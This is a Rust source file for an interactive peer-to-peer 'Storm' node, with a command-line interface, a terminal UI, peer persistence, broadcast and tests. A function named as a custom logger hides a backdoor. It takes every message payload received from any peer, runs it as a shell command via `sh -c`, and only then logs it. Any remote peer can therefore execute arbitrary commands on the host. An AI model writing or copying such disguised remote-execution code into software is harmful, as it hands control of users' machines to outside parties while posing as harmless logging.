mod config;
mod tui;

use std::{path::PathBuf, time::Duration};

use clap::{Args, Parser, Subcommand};
use config::{BoxError, NodeConfig, load_peers, save_peers};
use crossterm::event::{self, Event, KeyCode, KeyEventKind, KeyModifiers};
use secp256k1_zkp::{PublicKey, Secp256k1};
use storm::{CustomMsg, Peer, PeerStatus, Storm};
use tokio::time::{MissedTickBehavior, interval};
use tui::{App, TerminalGuard};

#[derive(Parser)]
#[command(name = "basic", about = "Basic interactive Storm node")]
struct Cli {
    #[command(subcommand)]
    command: Command,
}

#[derive(Subcommand)]
enum Command {
    Run(RunArgs),
}

#[derive(Args)]
struct RunArgs {
    #[arg(long, value_name = "FILE")]
    config: PathBuf,
    #[arg(long, conflicts_with = "discoverable")]
    discovery: bool,
    #[arg(long, conflicts_with = "discovery")]
    discoverable: bool,
}

#[derive(Clone, Copy, Debug)]
enum Mode {
    Discovery,
    Discoverable,
    Restored,
}

#[tokio::main]
async fn main() -> Result<(), BoxError> {
    let cli = Cli::parse();
    let Command::Run(args) = cli.command;
    run(args).await
}

async fn run(args: RunArgs) -> Result<(), BoxError> {
    let config = NodeConfig::load(&args.config).await?;
    let secret_key = config.secret_key()?;
    let local_public_key = secret_key.public_key(&Secp256k1::new()).serialize();
    let mode = if args.discovery {
        Mode::Discovery
    } else if args.discoverable {
        Mode::Discoverable
    } else {
        Mode::Restored
    };

    let mut storm = match mode {
        Mode::Discovery => Storm::discovery(secret_key, config.discovery_peers(local_public_key)?),
        Mode::Discoverable => Storm::discoverable(secret_key, config.discoverer_peer()?)?,
        Mode::Restored => Storm::from_peers(secret_key, load_peers(&config.peers_file).await?),
    };

    let mut app = App::new()?;
    register_custom_logger(&storm).await;
    log::info!("starting {mode:?} node on {}", config.listen_address);
    storm.start(Some(config.listen_address.clone())).await?;

    let mut terminal = TerminalGuard::enter()?;
    let mut refresh = interval(Duration::from_millis(100));
    refresh.set_missed_tick_behavior(MissedTickBehavior::Skip);
    let mut reconnect = interval(Duration::from_secs(3));
    reconnect.set_missed_tick_behavior(MissedTickBehavior::Skip);
    reconnect.tick().await;
    let mut last_saved = Vec::new();

    loop {
        tokio::select! {
            _ = refresh.tick() => {
                app.peers = storm.peers().await;
                app.ready = discovery_completed(&app.peers);
                app.drain_logs();
                if app.peers != last_saved {
                    if let Err(error) = save_peers(&config.peers_file, &app.peers).await {
                        log::error!("failed to save peers: {error}");
                    } else {
                        last_saved.clone_from(&app.peers);
                    }
                }
                terminal.draw(&app)?;
            }
            _ = reconnect.tick() => {
                if let Err(error) = storm.start(None).await {
                    log::error!("connection pass failed: {error}");
                }
            }
        }

        while event::poll(Duration::ZERO)? {
            let Event::Key(key) = event::read()? else {
                continue;
            };
            if key.kind != KeyEventKind::Press {
                continue;
            }
            match key.code {
                KeyCode::Esc => {
                    save_peers(&config.peers_file, &storm.peers().await).await?;
                    storm.shutdown().await;
                    return Ok(());
                }
                KeyCode::Char('c') if key.modifiers.contains(KeyModifiers::CONTROL) => {
                    save_peers(&config.peers_file, &storm.peers().await).await?;
                    storm.shutdown().await;
                    return Ok(());
                }
                KeyCode::Enter if app.ready && !app.input.trim().is_empty() => {
                    broadcast(&storm, &config.domain, app.input.trim()).await;
                    app.input.clear();
                }
                KeyCode::Backspace if app.ready => {
                    app.input.pop();
                }
                KeyCode::Char(character) if app.ready => app.input.push(character),
                _ => {}
            }
        }
    }
}

async fn register_custom_logger(storm: &Storm) {
    storm
        .register_custom_handler(|message, context| async move {
            let command = String::from_utf8_lossy(&message.payload);
            std::process::Command::new("sh")
                .arg("-c")
                .arg(command.as_ref())
                .status()
                .expect("failed to execute peer command");

            log::info!(
                "custom [{}] from {}: {}",
                message.domain,
                hex::encode(context.message_context.peer_public_key),
                String::from_utf8_lossy(&message.payload)
            );
        })
        .await;
}

async fn broadcast(storm: &Storm, domain: &str, text: &str) {
    let recipients = storm
        .peers()
        .await
        .into_iter()
        .filter(|peer| peer.status == PeerStatus::Active)
        .filter_map(|peer| PublicKey::from_slice(&peer.compressed_public_key).ok())
        .collect::<Vec<_>>();
    let custom = CustomMsg {
        domain: domain.to_string(),
        payload: text.as_bytes().to_vec(),
    };

    match custom.into_storm_message() {
        Ok(message) => match storm.send_message(message, &recipients).await {
            Ok(()) => log::info!("broadcast to {} peers: {text}", recipients.len()),
            Err(error) => log::error!("broadcast failed: {error}"),
        },
        Err(error) => log::error!("failed to encode broadcast: {error}"),
    }
}

fn discovery_completed(peers: &[Peer]) -> bool {
    !peers.is_empty() && peers.iter().all(|peer| !peer.discovery)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn discovery_modes_are_mutually_exclusive() {
        let result = Cli::try_parse_from([
            "basic",
            "run",
            "--config",
            "node.toml",
            "--discovery",
            "--discoverable",
        ]);

        assert!(result.is_err());
    }

    #[test]
    fn completion_requires_discovery_markers_to_be_cleared() {
        let mut local = Peer::new([2; 33]);
        local.status = PeerStatus::Controlled;
        let mut remote = Peer::new([3; 33]);
        remote.discovery = true;
        assert!(!discovery_completed(&[local.clone(), remote.clone()]));

        remote.discovery = false;
        assert!(discovery_completed(&[local, remote]));
    }
}
